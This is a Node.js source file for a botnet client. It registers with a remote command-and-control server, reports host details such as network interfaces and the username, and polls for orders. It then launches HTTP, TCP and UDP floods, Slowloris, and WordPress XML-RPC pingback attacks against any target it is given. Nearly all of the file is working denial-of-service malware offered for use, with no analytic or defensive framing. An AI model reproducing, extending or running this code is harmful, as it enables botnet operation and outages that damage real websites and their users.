// JavaScript Bot Client - ENHANCED WITH ALL ATTACK METHODS
// Save as: js_bot_enhanced.js
// Run: node js_bot_enhanced.js

const https = require('https');
const http = require('http');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');
const os = require('os');
const url = require('url');

class JSBot {
    constructor() {
        this.serverUrl = "https://c2-server-io.onrender.com";
        this.botId = 'JS-' + crypto.randomBytes(4).toString('hex').toUpperCase();
        this.connected = false;
        this.currentAttack = null;
        this.attackThreads = [];
        
        // Bot specifications
        this.specs = {
            bot_id: this.botId,
            cpu_cores: os.cpus().length,
            ram_gb: Math.round(os.totalmem() / (1024 ** 3) * 10) / 10,
            os: os.platform(),
            hostname: os.hostname(),
            client_type: 'javascript',
            capabilities: {
                javascript: true,
                http: true,
                tcp: true,
                udp: true,
                slowloris: true,
                wordpress: true
            }
        };
        
        this.stats = {
            total_attacks: 0,
            successful_attacks: 0,
            total_requests: 0,
            bytes_sent: 0
        };
        
        console.log('\n' + '='.repeat(60));
        console.log('  JAVASCRIPT BOT CLIENT - ENHANCED');
        console.log('='.repeat(60));
        console.log(`Bot ID: ${this.botId}`);
        console.log(`Server: ${this.serverUrl}`);
        console.log(`CPU Cores: ${this.specs.cpu_cores}`);
        console.log(`RAM: ${this.specs.ram_gb}GB`);
        console.log(`OS: ${this.specs.os}`);
        console.log('='.repeat(60) + '\n');
    }
    
    async sendRequest(endpoint, method = 'POST', data = null) {
        return new Promise((resolve, reject) => {
            const options = {
                hostname: 'c2-server-io.onrender.com',
                port: 443,
                path: endpoint,
                method: method,
                headers: {
                    'Content-Type': 'application/json',
                    'User-Agent': 'JSBot/1.0'
                },
                rejectUnauthorized: false,
                timeout: 15000
            };
            
            const req = https.request(options, (res) => {
                let response = '';
                res.on('data', (chunk) => {
                    response += chunk;
                });
                res.on('end', () => {
                    try {
                        resolve(JSON.parse(response));
                    } catch {
                        resolve(response);
                    }
                });
            });
            
            req.on('error', reject);
            req.on('timeout', () => {
                req.destroy();
                reject(new Error('Timeout'));
            });
            
            if (data) {
                req.write(JSON.stringify(data));
            }
            
            req.end();
        });
    }
    
    async connect() {
        console.log('[1] Connecting to server...');
        
        try {
            const data = {
                bot_id: this.botId,
                specs: this.specs,
                stats: this.stats
            };
            
            const response = await this.sendRequest('/check_approval', 'POST', data);
            
            if (response.approved) {
                this.connected = true;
                console.log('[✓] CONNECTED! Bot approved by server.');
                console.log(`[✓] Client Type: ${response.client_type}`);
                
                // Send connected status
                await this.sendRequest('/status', 'POST', {
                    bot_id: this.botId,
                    status: 'connected',
                    message: 'JavaScript bot online with all attack capabilities'
                });
                
                return true;
            } else {
                console.log('[X] Connection failed:', response);
                return false;
            }
        } catch (error) {
            console.log('[X] Connection error:', error.message);
            return false;
        }
    }
    
    async heartbeat() {
        if (!this.connected) return;
        
        try {
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'idle',
                stats: this.stats
            });
            console.log(`[♥] Heartbeat sent at ${new Date().toLocaleTimeString()}`);
        } catch (error) {
            console.log('[!] Heartbeat failed:', error.message);
            this.connected = false;
        }
    }
    
    async checkCommands() {
        try {
            const response = await this.sendRequest(`/commands/${this.botId}`, 'GET');
            return response.commands || [];
        } catch (error) {
            console.log('[!] Failed to check commands:', error.message);
            return [];
        }
    }
    
    async stopAllAttacks() {
        console.log('[!] Stopping all attacks...');
        this.attackThreads.forEach(thread => {
            if (thread && thread.destroy) thread.destroy();
        });
        this.attackThreads = [];
        this.currentAttack = null;
        
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'stopped',
            message: 'All attacks stopped'
        });
    }
    
    async executePing() {
        console.log('[→] Executing PING command');
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'ping',
            message: 'Pong from JavaScript bot'
        });
    }
    
    async executeSysInfo() {
        console.log('[→] Executing SYSINFO command');
        const sysInfo = {
            uptime: os.uptime(),
            loadavg: os.loadavg(),
            freemem: Math.round(os.freemem() / (1024 ** 2)),
            network: os.networkInterfaces(),
            user: os.userInfo().username
        };
        
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'sysinfo',
            message: JSON.stringify(sysInfo)
        });
    }
    
    // ================= ATTACK METHODS =================
    
    async executeHTTPFlood(command) {
        console.log(`[⚡] Starting HTTP ${command.method} flood to ${command.target}`);
        
        const targetUrl = new URL(command.target);
        const threads = parseInt(command.threads) || 100;
        const duration = parseInt(command.duration) * 1000 || 60000;
        const method = command.method || 'GET';
        const userAgents = command.user_agents || [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ];
        
        let requestCount = 0;
        const startTime = Date.now();
        const endTime = startTime + duration;
        
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'running',
            message: `HTTP ${method} flood to ${targetUrl.hostname}`
        });
        
        const makeRequest = () => {
            if (Date.now() > endTime) return false;
            
            const options = {
                hostname: targetUrl.hostname,
                port: targetUrl.port || (targetUrl.protocol === 'https:' ? 443 : 80),
                path: targetUrl.pathname + targetUrl.search,
                method: method,
                headers: {
                    'User-Agent': userAgents[Math.floor(Math.random() * userAgents.length)],
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.5',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Cache-Control': 'no-cache'
                },
                timeout: 10000
            };
            
            const protocol = targetUrl.protocol === 'https:' ? https : http;
            const req = protocol.request(options, (res) => {
                requestCount++;
                this.stats.total_requests++;
                res.on('data', () => {}); // Consume data
                res.on('end', () => {});
            });
            
            req.on('error', () => {});
            req.on('timeout', () => {
                req.destroy();
            });
            
            if (method === 'POST') {
                const postData = `data=${crypto.randomBytes(100).toString('hex')}`;
                req.setHeader('Content-Type', 'application/x-www-form-urlencoded');
                req.setHeader('Content-Length', Buffer.byteLength(postData));
                req.write(postData);
            }
            
            req.end();
            return true;
        };
        
        // Create worker threads
        for (let i = 0; i < threads; i++) {
            const worker = setInterval(() => {
                if (!makeRequest()) {
                    clearInterval(worker);
                }
            }, 1); // Minimal delay for max throughput
            
            this.attackThreads.push(worker);
        }
        
        // Stop after duration
        setTimeout(async () => {
            this.stopAllAttacks();
            console.log(`[✓] HTTP flood completed. Requests sent: ${requestCount}`);
            
            this.stats.successful_attacks++;
            this.stats.total_attacks++;
            
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'success',
                message: `HTTP flood completed - ${requestCount} requests sent`
            });
        }, duration);
    }
    
    async executeTCPFlood(command) {
        console.log(`[⚡] Starting TCP flood to ${command.target}`);
        
        const [host, portStr] = command.target.split(':');
        const port = parseInt(portStr) || 80;
        const threads = parseInt(command.threads) || 75;
        const duration = parseInt(command.duration) * 1000 || 60000;
        
        let connectionCount = 0;
        const startTime = Date.now();
        const endTime = startTime + duration;
        
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'running',
            message: `TCP flood to ${host}:${port}`
        });
        
        const createConnection = () => {
            if (Date.now() > endTime) return false;
            
            const socket = new net.Socket();
            
            socket.setTimeout(5000);
            socket.connect(port, host, () => {
                connectionCount++;
                this.stats.total_requests++;
                
                // Send random data
                const data = crypto.randomBytes(1024);
                socket.write(data);
                this.stats.bytes_sent += data.length;
                
                // Keep sending
                const sendInterval = setInterval(() => {
                    if (Date.now() > endTime) {
                        clearInterval(sendInterval);
                        socket.destroy();
                        return;
                    }
                    const moreData = crypto.randomBytes(512);
                    socket.write(moreData);
                    this.stats.bytes_sent += moreData.length;
                }, 100);
                
                socket.on('error', () => {
                    clearInterval(sendInterval);
                    socket.destroy();
                });
                
                socket.on('timeout', () => {
                    clearInterval(sendInterval);
                    socket.destroy();
                });
                
                this.attackThreads.push({ destroy: () => {
                    clearInterval(sendInterval);
                    socket.destroy();
                }});
            });
            
            socket.on('error', () => {});
            return true;
        };
        
        // Create connections
        for (let i = 0; i < threads; i++) {
            const interval = setInterval(() => {
                if (!createConnection()) {
                    clearInterval(interval);
                }
            }, 50);
            
            this.attackThreads.push(interval);
        }
        
        // Stop after duration
        setTimeout(async () => {
            this.stopAllAttacks();
            console.log(`[✓] TCP flood completed. Connections: ${connectionCount}`);
            
            this.stats.successful_attacks++;
            this.stats.total_attacks++;
            
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'success',
                message: `TCP flood completed - ${connectionCount} connections`
            });
        }, duration);
    }
    
    async executeUDPFlood(command) {
        console.log(`[⚡] Starting UDP flood to ${command.target}`);
        
        const [host, portStr] = command.target.split(':');
        const port = parseInt(portStr) || 80;
        const threads = parseInt(command.threads) || 75;
        const duration = parseInt(command.duration) * 1000 || 60000;
        
        let packetCount = 0;
        const startTime = Date.now();
        const endTime = startTime + duration;
        
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'running',
            message: `UDP flood to ${host}:${port}`
        });
        
        const sendUDPPacket = () => {
            if (Date.now() > endTime) return false;
            
            const socket = dgram.createSocket('udp4');
            const data = crypto.randomBytes(1024);
            
            socket.send(data, 0, data.length, port, host, (err) => {
                socket.close();
                if (!err) {
                    packetCount++;
                    this.stats.total_requests++;
                    this.stats.bytes_sent += data.length;
                }
            });
            
            return true;
        };
        
        // Send packets
        for (let i = 0; i < threads; i++) {
            const interval = setInterval(() => {
                if (!sendUDPPacket()) {
                    clearInterval(interval);
                }
            }, 1);
            
            this.attackThreads.push(interval);
        }
        
        // Stop after duration
        setTimeout(async () => {
            this.stopAllAttacks();
            console.log(`[✓] UDP flood completed. Packets sent: ${packetCount}`);
            
            this.stats.successful_attacks++;
            this.stats.total_attacks++;
            
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'success',
                message: `UDP flood completed - ${packetCount} packets`
            });
        }, duration);
    }
    
    async executeSlowloris(command) {
        console.log(`[⚡] Starting Slowloris attack to ${command.target}`);
        
        const targetUrl = new URL(command.target);
        const connections = parseInt(command.connections) || 200;
        const duration = parseInt(command.duration) * 1000 || 120000;
        
        const activeSockets = [];
        const startTime = Date.now();
        const endTime = startTime + duration;
        
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'running',
            message: `Slowloris attack to ${targetUrl.hostname}`
        });
        
        const createSlowlorisConnection = () => {
            if (Date.now() > endTime) return null;
            
            const socket = net.createConnection({
                host: targetUrl.hostname,
                port: targetUrl.port || 80
            });
            
            const headers = [
                `GET ${targetUrl.pathname} HTTP/1.1`,
                `Host: ${targetUrl.hostname}`,
                `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`,
                `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
                `Accept-Language: en-US,en;q=0.5`,
                `Accept-Encoding: gzip, deflate`,
                `Connection: keep-alive`,
                `Cache-Control: no-cache`,
                `\r\n`
            ].join('\r\n');
            
            socket.write(headers);
            activeSockets.push(socket);
            
            // Send keep-alive headers periodically
            const keepAliveInterval = setInterval(() => {
                if (socket && !socket.destroyed) {
                    socket.write(`X-a: ${crypto.randomBytes(4).toString('hex')}\r\n`);
                }
            }, 15000);
            
            socket.on('error', () => {
                clearInterval(keepAliveInterval);
            });
            
            socket.on('timeout', () => {
                clearInterval(keepAliveInterval);
            });
            
            return { socket, interval: keepAliveInterval };
        };
        
        // Create connections
        for (let i = 0; i < connections; i++) {
            setTimeout(() => {
                const conn = createSlowlorisConnection();
                if (conn) {
                    this.attackThreads.push({
                        destroy: () => {
                            clearInterval(conn.interval);
                            if (conn.socket) conn.socket.destroy();
                        }
                    });
                }
            }, i * 100); // Stagger connections
        }
        
        // Stop after duration
        setTimeout(async () => {
            this.stopAllAttacks();
            console.log(`[✓] Slowloris completed. Active connections: ${activeSockets.length}`);
            
            this.stats.successful_attacks++;
            this.stats.total_attacks++;
            
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'success',
                message: `Slowloris completed - ${activeSockets.length} connections`
            });
        }, duration);
    }
    
    async executeWordPressAttack(command) {
        console.log(`[⚡] Starting WordPress XML-RPC attack to ${command.target}`);
        
        const targetUrl = command.target.replace(/\/$/, '');
        const xmlrpcUrl = `${targetUrl}/xmlrpc.php`;
        const threads = parseInt(command.threads) || 50;
        const duration = parseInt(command.duration) * 1000 || 60000;
        
        let requestCount = 0;
        const startTime = Date.now();
        const endTime = startTime + duration;
        
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'running',
            message: `WordPress attack to ${targetUrl}`
        });
        
        const xmlPayload = `<?xml version="1.0"?>
<methodCall>
<methodName>system.multicall</methodName>
<params>
<param>
<value>
<array>
<data>
${Array(50).fill(0).map(() => `
<value>
<struct>
<member>
<name>methodName</name>
<value><string>pingback.ping</string></value>
</member>
<member>
<name>params</name>
<value>
<array>
<data>
<value><string>http://${crypto.randomBytes(8).toString('hex')}.com</string></value>
<value><string>${targetUrl}</string></value>
</data>
</array>
</value>
</member>
</struct>
</value>`).join('')}
</data>
</array>
</value>
</param>
</params>
</methodCall>`;
        
        const makeRequest = () => {
            if (Date.now() > endTime) return false;
            
            const urlParts = new URL(xmlrpcUrl);
            const options = {
                hostname: urlParts.hostname,
                port: urlParts.port || 80,
                path: urlParts.pathname,
                method: 'POST',
                headers: {
                    'Content-Type': 'text/xml',
                    'Content-Length': Buffer.byteLength(xmlPayload),
                    'User-Agent': 'WordPress/6.4',
                    'Connection': 'close'
                },
                timeout: 10000
            };
            
            const req = http.request(options, (res) => {
                requestCount++;
                this.stats.total_requests++;
                res.on('data', () => {});
                res.on('end', () => {});
            });
            
            req.on('error', () => {});
            req.on('timeout', () => {
                req.destroy();
            });
            
            req.write(xmlPayload);
            req.end();
            return true;
        };
        
        // Create worker threads
        for (let i = 0; i < threads; i++) {
            const worker = setInterval(() => {
                if (!makeRequest()) {
                    clearInterval(worker);
                }
            }, 100);
            
            this.attackThreads.push(worker);
        }
        
        // Stop after duration
        setTimeout(async () => {
            this.stopAllAttacks();
            console.log(`[✓] WordPress attack completed. Requests: ${requestCount}`);
            
            this.stats.successful_attacks++;
            this.stats.total_attacks++;
            
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'success',
                message: `WordPress attack completed - ${requestCount} requests`
            });
        }, duration);
    }
    
    async executeCommand(command) {
        console.log(`[→] Executing: ${command.type}`);
        
        // Send status that we're processing
        await this.sendRequest('/status', 'POST', {
            bot_id: this.botId,
            status: 'running',
            message: `Executing ${command.type}`
        });
        
        try {
            switch (command.type) {
                case 'ping':
                    await this.executePing();
                    break;
                    
                case 'sysinfo':
                    await this.executeSysInfo();
                    break;
                    
                case 'stop_all':
                    await this.stopAllAttacks();
                    break;
                    
                case 'http_flood':
                    await this.executeHTTPFlood(command);
                    break;
                    
                case 'tcp_flood':
                    await this.executeTCPFlood(command);
                    break;
                    
                case 'udp_flood':
                    await this.executeUDPFlood(command);
                    break;
                    
                case 'slowloris':
                    await this.executeSlowloris(command);
                    break;
                    
                case 'wordpress_xmlrpc':
                    await this.executeWordPressAttack(command);
                    break;
                    
                default:
                    console.log(`[!] Unknown command type: ${command.type}`);
                    await this.sendRequest('/status', 'POST', {
                        bot_id: this.botId,
                        status: 'error',
                        message: `Unknown command: ${command.type}`
                    });
            }
            
            console.log(`[✓] ${command.type} command handled`);
            
        } catch (error) {
            console.log(`[X] Error executing ${command.type}:`, error.message);
            await this.sendRequest('/status', 'POST', {
                bot_id: this.botId,
                status: 'error',
                message: `Failed: ${error.message}`
            });
        }
    }
    
    async run() {
        // Initial connection
        if (!await this.connect()) {
            console.log('[!] Failed to connect. Retrying in 10 seconds...');
            setTimeout(() => this.run(), 10000);
            return;
        }
        
        // Start heartbeat every 15 seconds
        setInterval(() => this.heartbeat(), 15000);
        
        console.log('[+] Listening for commands...\n');
        
        // Main loop
        while (true) {
            try {
                // Check for commands
                const commands = await this.checkCommands();
                
                if (commands.length > 0) {
                    console.log(`[+] Received ${commands.length} command(s)`);
                    
                    for (const cmd of commands) {
                        // Execute command asynchronously
                        this.executeCommand(cmd).catch(console.error);
                    }
                }
                
                // Wait 3 seconds before checking again
                await new Promise(resolve => setTimeout(resolve, 3000));
                
            } catch (error) {
                console.log('[!] Error in main loop:', error.message);
                await new Promise(resolve => setTimeout(resolve, 10000));
            }
        }
    }
}

// Start the bot
const bot = new JSBot();

// Handle graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n[!] Shutting down bot...');
    await bot.stopAllAttacks();
    console.log('[✓] Bot stopped gracefully');
    process.exit(0);
});

bot.run().catch(console.error);
